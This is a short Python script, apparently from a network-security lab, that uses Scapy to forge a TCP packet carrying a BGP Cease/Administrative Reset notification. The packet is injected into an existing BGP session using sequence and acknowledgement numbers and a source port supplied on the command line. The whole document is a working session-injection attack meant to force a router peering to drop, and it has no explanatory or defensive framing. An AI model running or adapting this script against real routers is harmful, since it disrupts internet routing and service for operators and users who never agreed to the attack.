from scapy.all import *
from scapy.contrib.bgp import *
from scapy.layers.inet import IP, TCP
load_contrib('bgp')


# Pass seq num, ack num, and source port on cmd line

base= IP(src="192.168.4.1", dst="192.168.4.2", proto=6, ttl=1)
tcp = TCP(dport=179, sport=int(sys.argv[3]), seq=int(sys.argv[1]), ack=int(sys.argv[2]), flags="PA")

#Type 3 is notification, marker is used for authentication, max hex for no auth(32 fs)
BGPHeader = BGPHeader(type=3, marker=0xffffffffffffffffffffffffffffffff)

BGPNotif = BGPNotification(error_code=6, error_subcode=4)


packet = base / tcp / BGPHeader / BGPNotif
packet.show()
send(packet)

